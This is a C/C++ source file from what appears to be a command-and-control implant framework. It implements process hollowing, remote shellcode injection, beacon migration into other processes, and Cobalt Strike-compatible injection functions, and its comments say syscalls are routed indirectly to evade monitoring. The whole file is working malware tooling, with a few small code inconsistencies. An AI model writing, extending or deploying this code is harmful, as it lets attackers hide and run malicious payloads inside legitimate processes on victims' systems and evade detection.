/*
 * Process Injection, Hollowing, and Migration
 *
 * Implements:
 * - Process hollowing via NtCreateUserProcess (suspended target, unmap, map payload, resume)
 * - Classic injection via NtAllocateVirtualMemory + NtCreateThreadEx
 * - BeaconInjectProcess / BeaconInjectTemporaryProcess (BOF compatibility)
 * - Process migration (spawn new beacon in target, transfer state, kill old)
 *
 * All syscalls go through the indirect HWBP-based VEH system.
 */

 /*
 This should probably be the place to introduce BOF chains. MAYBE. like, look:
 Server sends "chain hollowing BOF to PID xxx, then inject BOF xxx into it".
 Actually. Maybe we... ahh, I don't know. it's 3AM and I'm just saying stuff.
 */

#include "../include/injection.h"
#include "../include/syscalls.h"
#include "../include/resolver.h"
#include "../include/utils.h"
#include "../include/managers.h"
#include "../libs/bastia/bastia.h"

#ifdef _WIN32

#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

#ifndef GetProcessId
// If GetProcessId isn't resolved, use a simpler debug print
#define GetProcessId(h) ((DWORD)(UINT_PTR)(h))
#endif

/* ============================================================================
 * Constants
 * ============================================================================ */

static constexpr SIZE_T MAX_HOLLOWING_PAYLOAD_EXPORT = 10 * 1024 * 1024;  // 10MB max
static constexpr SIZE_T STACK_SIZE = 0x100000;  // 1MB default stack

/* ============================================================================
 * PE Helper Structures
 * ============================================================================ */

// PEB ImageBaseAddress offset (varies by OS, but this is standard for Win10+)
#define PEB_IMAGE_BASE_OFFSET 0x10
#define PEB_ENTRY_COUNT_OFFSET 0x18
#define PEB_LDR_DATA_OFFSET 0x18

// Basic PE parsing helpers
static IMAGE_NT_HEADERS64* RvaToVa(PVOID base, DWORD rva) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((UINT8*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    return nt;
}

static void* RVAToOffset(PVOID base, DWORD rva, functionTable* nt) {
    IMAGE_NT_HEADERS64* ntHdr = RvaToVa(base, 0);
    if (!ntHdr) return (void*)(UINT_PTR)rva;

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHdr);
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (rva >= sections[i].VirtualAddress &&
            rva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
            return (void*)((UINT8*)base + rva - sections[i].VirtualAddress + sections[i].PointerToRawData);
        }
    }
    return (void*)(UINT_PTR)rva;
}

/* ============================================================================
 * Process Hollowing
 *
 * Spawns a suspended process, unmaps the original image, maps our payload,
 * updates PEB, and resumes the primary thread.
 *
 * Payload must be a full PE (DLL or EXE) in memory (already loaded format).
 * ============================================================================ */

BOOL ProcessHollow(functionTable* nt, const wchar_t* targetPath,
                   const uint8_t* payload, SIZE_T payloadSize,
                   HANDLE* outProcess, HANDLE* outThread) {
    if (!nt || !targetPath || !payload || payloadSize == 0) {
        return FALSE;
    }

    if (payloadSize > MAX_HOLLOWING_PAYLOAD) {
        g_debugPrint("[HOLLOW] Payload too large: %zu", payloadSize);
        return FALSE;
    }

    // Validate PE header
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        g_debugPrint("[HOLLOW] Invalid DOS signature");
        return FALSE;
    }

    if ((SIZE_T)dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > payloadSize) {
        g_debugPrint("[HOLLOW] e_lfanew out of bounds");
        return FALSE;
    }

    IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)((UINT8*)payload + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        g_debugPrint("[HOLLOW] Invalid NT signature");
        return FALSE;
    }

    if (ntHeaders->OptionalHeader.SizeOfHeaders > payloadSize) {
        g_debugPrint("[HOLLOW] SizeOfHeaders out of bounds");
        return FALSE;
    }

    /* Step 1: Create suspended target process via NtCreateUserProcess */
    UNICODE_STRING ntImagePath = {};
    nt->RtlInitUnicodeString(&ntImagePath, targetPath);

    // Convert DOS path to NT path (e.g., C:\ -> \Device\HarddiskVolumeN\)
    // For simplicity, we use the known format
    wchar_t ntPathBuf[512];
    SIZE_T pathLen = 0;
    while (targetPath[pathLen] && pathLen < 511) pathLen++;

    // Check if already NT path
    if (pathLen >= 4 && targetPath[0] == L'\\' && targetPath[1] == L'D' &&
        targetPath[2] == L'e' && targetPath[3] == L'v') {
        // Already NT path
        __memcpy(ntPathBuf, targetPath, (pathLen + 1) * sizeof(wchar_t));
    } else {
        // Convert C:\path -> \??\C:\path
        const wchar_t* ntPrefix = lcg_encryptw(L"\\\\??\\\\");
        for (SIZE_T i = 0; i < 4; i++) ntPathBuf[i] = ntPrefix[i];
        for (SIZE_T i = 0; i <= pathLen; i++) {
            ntPathBuf[4 + i] = targetPath[i];
        }
    }

    UNICODE_STRING ntTargetPath = {};
    nt->RtlInitUnicodeString(&ntTargetPath, ntPathBuf);

    PRTL_USER_PROCESS_PARAMETERS procParams = nullptr;
    NTSTATUS status = nt->RtlCreateProcessParametersEx(
        &procParams, &ntTargetPath, nullptr, nullptr,
        &ntTargetPath, nullptr, nullptr, nullptr, nullptr, nullptr,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (!NT_SUCCESS(status) || !procParams) {
        g_debugPrint("[HOLLOW] RtlCreateProcessParametersEx failed: 0x%08X", status);
        return FALSE;
    }

    PS_CREATE_INFO createInfo = {};
    createInfo.Size = sizeof(createInfo);
    createInfo.State = PsCreateInitialState;

    PS_ATTRIBUTE_LIST attribList = {};
    attribList.TotalLength = sizeof(PS_ATTRIBUTE_LIST);
    attribList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attribList.Attributes[0].Size = ntTargetPath.Length;
    attribList.Attributes[0].Value = (ULONG_PTR)ntTargetPath.Buffer;

    HANDLE hProcess = nullptr;
    HANDLE hThread = nullptr;

    status = nt->NtCreateUserProcess(
        &hProcess, &hThread,
        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
        nullptr, nullptr,
        0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        procParams, &createInfo, &attribList
    );

    nt->RtlFreeHeap(__GetProcessHeap(getCurrentPEB()), 0, procParams);

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[HOLLOW] NtCreateUserProcess failed: 0x%08X", status);
        return FALSE;
    }

    g_debugPrint("[HOLLOW] Target process created: pid=%lu", GetProcessId(hProcess));

    /* Step 2: Unmap original image */
    status = nt->NtUnmapViewOfSection(hProcess, nullptr);
    if (!NT_SUCCESS(status)) {
        g_debugPrint("[HOLLOW] NtUnmapViewOfSection failed: 0x%08X", status);
        nt->NtTerminateProcess(hProcess, 1);
        nt->NtClose(hProcess);
        nt->NtClose(hThread);
        return FALSE;
    }

    g_debugPrint("[HOLLOW] Original image unmapped");

    /* Step 3: Allocate memory in target at payload's ImageBase */
    PVOID imageBase = (PVOID)(UINT_PTR)ntHeaders->OptionalHeader.ImageBase;
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    PVOID allocBase = imageBase;

    status = nt->NtAllocateVirtualMemory(
        hProcess, &allocBase, 0, &imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        // If preferred base is unavailable, let system choose
        allocBase = nullptr;
        status = nt->NtAllocateVirtualMemory(
            hProcess, &allocBase, 0, &imageSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        );
        if (!NT_SUCCESS(status)) {
            g_debugPrint("[HOLLOW] NtAllocateVirtualMemory failed: 0x%08X", status);
            nt->NtTerminateProcess(hProcess, 1);
            nt->NtClose(hProcess);
            nt->NtClose(hThread);
            return FALSE;
        }
        imageBase = allocBase;
    }

    g_debugPrint("[HOLLOW] Allocated %zu bytes at %p", imageSize, imageBase);

    /* Step 4: Write PE headers */
    SIZE_T headerSize = ntHeaders->OptionalHeader.SizeOfHeaders;
    NTSTATUS writeStatus = nt->NtWriteVirtualMemory(
        hProcess, imageBase, (PVOID)payload, headerSize, nullptr);

    if (!NT_SUCCESS(writeStatus)) {
        g_debugPrint("[HOLLOW] Write headers failed: 0x%08X", writeStatus);
        nt->NtTerminateProcess(hProcess, 1);
        nt->NtClose(hProcess);
        nt->NtClose(hThread);
        return FALSE;
    }

    /* Step 5: Write sections and set protections */
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData == 0) continue;

        PVOID sectionAddr = (PVOID)((UINT8*)imageBase + sections[i].VirtualAddress);
        SIZE_T sectionSize = sections[i].SizeOfRawData;

        // Write section data
        NTSTATUS writeStatus = nt->NtWriteVirtualMemory(
            hProcess, sectionAddr,
            (PVOID)((UINT8*)payload + sections[i].PointerToRawData),
            sectionSize, nullptr);

        if (!NT_SUCCESS(writeStatus)) {
            g_debugPrint("[HOLLOW] Write section %d failed: 0x%08X", i, writeStatus);
            continue;  // Try remaining sections
        }

        // Set section protection
        ULONG protect = PAGE_READONLY;
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            protect = (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        }

        SIZE_T regionSize = sections[i].Misc.VirtualSize;
        if (regionSize == 0) regionSize = sections[i].SizeOfRawData;

        nt->NtProtectVirtualMemory(hProcess, &sectionAddr, &regionSize, protect, &protect);
    }

    g_debugPrint("[HOLLOW] Sections written");

    /* Step 6: Update PEB ImageBaseAddress */
    // Read current PEB to find image base field location
    PROCESS_BASIC_INFORMATION pbi = {};
    status = nt->NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);

    if (NT_SUCCESS(status) && pbi.PebBaseAddress) {
        // Write new image base into PEB
        PVOID remotePeb = pbi.PebBaseAddress;
        PVOID newImageBase = imageBase;

        // Write to PEB+0x10 (ImageBaseAddress on x64)
        PVOID pebImageBaseAddr = (PVOID)((UINT8*)remotePeb + PEB_IMAGE_BASE_OFFSET);

        NTSTATUS writePebStatus = nt->NtWriteVirtualMemory(
            hProcess, pebImageBaseAddr, &newImageBase, sizeof(PVOID), nullptr);

        if (!NT_SUCCESS(writePebStatus)) {
            g_debugPrint("[HOLLOW] Update PEB image base failed: 0x%08X (non-fatal)", writePebStatus);
        }
    }

    g_debugPrint("[HOLLOW] PEB updated with new image base: %p", imageBase);

    /* Step 7: Update entry point in thread context */
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;

    if (nt->GetThreadContext && nt->GetThreadContext(hThread, &ctx)) {
        // RAX = entry point (ImageBase + AddressOfEntryPoint)
        ctx.Rax = (DWORD64)((UINT8*)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        ctx.ContextFlags = CONTEXT_FULL;
        if (nt->SetThreadContext) {
            nt->SetThreadContext(hThread, &ctx);
        }
        g_debugPrint("[HOLLOW] Thread context updated: entry=%p",
                     (void*)(UINT_PTR)ctx.Rax);
    }

    /* Step 8: Resume thread */
    status = nt->NtResumeThread(hThread, nullptr);
    if (!NT_SUCCESS(status)) {
        g_debugPrint("[HOLLOW] NtResumeThread failed: 0x%08X", status);
        nt->NtTerminateProcess(hProcess, 1);
        nt->NtClose(hProcess);
        nt->NtClose(hThread);
        return FALSE;
    }

    if (outProcess) *outProcess = hProcess;
    if (outThread) *outThread = hThread;

    g_debugPrint("[HOLLOW] Process hollowing complete - thread resumed");
    return TRUE;
}

/* ============================================================================
 * Classic Process Injection
 *
 * Opens target process, allocates memory, writes shellcode, creates remote
 * thread via NtCreateThreadEx.
 * ============================================================================ */

BOOL InjectIntoProcess(functionTable* nt, DWORD pid,
                       const uint8_t* shellcode, SIZE_T shellcodeSize,
                       HANDLE* outProcess, HANDLE* outThread) {
    if (!nt || pid == 0 || !shellcode || shellcodeSize == 0) {
        return FALSE;
    }

    /* Step 1: Open target process */
    HANDLE hProcess = nullptr;
    OBJECT_ATTRIBUTES objAttrs = {};
    InitializeObjectAttributes(&objAttrs, nullptr, 0, nullptr, nullptr);

    CLIENT_ID clientId = {};
    clientId.UniqueProcess = (HANDLE)(UINT_PTR)pid;
    clientId.UniqueThread = nullptr;

    NTSTATUS status = nt->NtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        &objAttrs, &clientId
    );

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[INJECT] NtOpenProcess(%lu) failed: 0x%08X", pid, status);
        return FALSE;
    }

    g_debugPrint("[INJECT] Opened process %lu", pid);

    /* Step 2: Allocate memory in target */
    PVOID remoteAddr = nullptr;
    SIZE_T allocSize = shellcodeSize;

    status = nt->NtAllocateVirtualMemory(
        hProcess, &remoteAddr, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[INJECT] NtAllocateVirtualMemory failed: 0x%08X", status);
        nt->NtClose(hProcess);
        return FALSE;
    }

    g_debugPrint("[INJECT] Allocated %zu bytes at %p", shellcodeSize, remoteAddr);

    /* Step 3: Write shellcode */
    NTSTATUS writeStatus = nt->NtWriteVirtualMemory(
        hProcess, remoteAddr, (PVOID)shellcode, shellcodeSize, nullptr);

    if (!NT_SUCCESS(writeStatus)) {
        g_debugPrint("[INJECT] Write shellcode failed: 0x%08X", writeStatus);
        nt->NtFreeVirtualMemory(hProcess, &remoteAddr, &allocSize, MEM_RELEASE);
        nt->NtClose(hProcess);
        return FALSE;
    }

    /* Step 4: Protect to PAGE_EXECUTE_READ */
    ULONG oldProtect = 0;
    nt->NtProtectVirtualMemory(hProcess, &remoteAddr, &allocSize, PAGE_EXECUTE_READ, &oldProtect);

    g_debugPrint("[INJECT] Shellcode written and protected");

    /* Step 5: Create remote thread via NtCreateThreadEx */
    HANDLE hThread = nullptr;
    status = nt->NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, nullptr,
        hProcess,
        remoteAddr,
        nullptr,
        THREAD_CREATE_FLAGS_NONE,
        0, 0, 0, nullptr
    );

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[INJECT] Thread creation failed: 0x%08X", status);
        nt->NtFreeVirtualMemory(hProcess, &remoteAddr, &allocSize, MEM_RELEASE);
        nt->NtClose(hProcess);
        return FALSE;
    }

    g_debugPrint("[INJECT] Remote thread created");

    if (outProcess) *outProcess = hProcess;
    if (outThread) *outThread = hThread;

    return TRUE;
}

/* ============================================================================
 * Process Migration
 *
 * Spawns a new beacon instance in a target process, transfers session state,
 * and signals the old beacon to exit.
 *
 * The payload is the beacon DLL/EXE that will be hollowed into a new process.
 * ============================================================================ */

BOOL MigrateBeacon(functionTable* nt, const wchar_t* targetPath,
                   const uint8_t* beaconPayload, SIZE_T beaconPayloadSize) {
    if (!nt || !targetPath || !beaconPayload || beaconPayloadSize == 0) {
        return FALSE;
    }

    g_debugPrint("[MIGRATE] Starting migration to %ls (%zu bytes)",
                 targetPath, beaconPayloadSize);

    HANDLE hProcess = nullptr;
    HANDLE hThread = nullptr;

    // Use process hollowing to spawn the new beacon
    BOOL ok = ProcessHollow(nt, targetPath, beaconPayload, beaconPayloadSize,
                            &hProcess, &hThread);

    if (!ok) {
        g_debugPrint("[MIGRATE] Process hollowing failed");
        return FALSE;
    }

    g_debugPrint("[MIGRATE] New beacon spawned in target process");

    // The new beacon will do its own check-in with the server.
    // The server can then kill the old beacon after confirming the new one is alive.
    // For now, we just signal success - the old beacon continues until
    // the operator issues an EXIT command.

    if (hThread) nt->NtClose(hThread);
    if (hProcess) nt->NtClose(hProcess);

    g_debugPrint("[MIGRATE] Migration complete");
    return TRUE;
}

/* ============================================================================
 * BOF Compatibility: BeaconInjectProcess
 *
 * Signature matches Cobalt Strike's beacon.h
 * ============================================================================ */

void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len,
                          int p_offset, char* arg, int a_len) {
    functionTable* nt = getFuncTableFromGlobal();
    if (!nt || !hProc || pid == 0 || !payload || p_len <= 0) {
        return;
    }

    if (p_offset < 0 || p_offset >= p_len) {
        g_debugPrint("[BOF] BeaconInjectProcess: invalid offset %d (len=%d)", p_offset, p_len);
        return;
    }

    g_debugPrint("[BOF] BeaconInjectProcess: pid=%d len=%d", pid, p_len);

    // Skip offset if specified
    const uint8_t* shellcode = (const uint8_t*)payload + p_offset;
    SIZE_T shellcodeSize = p_len - p_offset;

    // Use classic injection
    HANDLE hProcess = nullptr;
    HANDLE hThread = nullptr;

    if (InjectIntoProcess(nt, (DWORD)pid, shellcode, shellcodeSize, &hProcess, &hThread)) {
        g_debugPrint("[BOF] Injection into PID %d successful", pid);
        if (hThread) nt->NtClose(hThread);
        if (hProcess) nt->NtClose(hProcess);
    } else {
        g_debugPrint("[BOF] Injection into PID %d failed", pid);
    }
}

/* ============================================================================
 * BOF Compatibility: BeaconInjectTemporaryProcess
 *
 * Injects into a process created by BeaconSpawnTemporaryProcess.
 * ============================================================================ */

void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload,
                                   int p_len, int p_offset, char* arg, int a_len) {
    functionTable* nt = getFuncTableFromGlobal();
    if (!nt || !pInfo || !payload || p_len <= 0) {
        return;
    }

    if (p_offset < 0 || p_offset >= p_len) {
        g_debugPrint("[BOF] BeaconInjectTemporaryProcess: invalid offset %d (len=%d)", p_offset, p_len);
        return;
    }

    g_debugPrint("[BOF] BeaconInjectTemporaryProcess: pid=%lu len=%d",
                 (unsigned long)pInfo->dwProcessId, p_len);

    const uint8_t* shellcode = (const uint8_t*)payload + p_offset;
    SIZE_T shellcodeSize = p_len - p_offset;

    // Allocate, write, and create thread in the already-open process
    PVOID remoteAddr = nullptr;
    SIZE_T allocSize = shellcodeSize;

    NTSTATUS status = nt->NtAllocateVirtualMemory(
        pInfo->hProcess, &remoteAddr, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[BOF] NtAllocateVirtualMemory failed: 0x%08X", status);
        return;
    }

    NTSTATUS writeStatus = nt->NtWriteVirtualMemory(
        pInfo->hProcess, remoteAddr, (PVOID)shellcode, shellcodeSize, nullptr);

    if (!NT_SUCCESS(writeStatus)) {
        g_debugPrint("[BOF] Write failed: 0x%08X", writeStatus);
        nt->NtFreeVirtualMemory(pInfo->hProcess, &remoteAddr, &allocSize, MEM_RELEASE);
        return;
    }

    ULONG oldProtect = 0;
    nt->NtProtectVirtualMemory(pInfo->hProcess, &remoteAddr, &allocSize, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = nullptr;
    status = nt->NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, nullptr,
        pInfo->hProcess,
        remoteAddr,
        nullptr, THREAD_CREATE_FLAGS_NONE,
        0, 0, 0, nullptr
    );

    if (NT_SUCCESS(status)) {
        g_debugPrint("[BOF] Temporary process injection successful");
        nt->NtClose(hThread);
    } else {
        g_debugPrint("[BOF] Thread creation failed: 0x%08X", status);
        nt->NtFreeVirtualMemory(pInfo->hProcess, &remoteAddr, &allocSize, MEM_RELEASE);
    }
}

/* ============================================================================
 * Global functionTable accessor (for injection module)
 * ============================================================================ */

static functionTable* g_injectfuncTable = nullptr;

void SetInjectionfuncTable(functionTable* nt) {
    g_injectfuncTable = nt;
}

functionTable* getFuncTableFromGlobal() {
    return g_injectfuncTable;
}

#endif /* _WIN32 */
